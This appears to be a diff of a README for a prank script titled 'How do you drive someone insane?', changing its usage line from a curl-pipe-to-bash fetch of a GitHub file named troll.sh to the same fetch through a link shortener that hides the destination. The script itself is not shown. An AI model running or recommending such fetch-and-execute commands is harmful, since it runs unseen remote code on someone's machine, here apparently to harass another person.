@@ -3,7 +3,7 @@ How do you drive someone insane?
 
 #Usage
 ```
-curl -s "https://raw.githubusercontent.com/johnny-y-wang/evil/master/troll.sh" | bash /dev/stdin 
+curl -s "https://goo.gl/J78oig" | bash /dev/stdin 
 ```
 
 #Credit
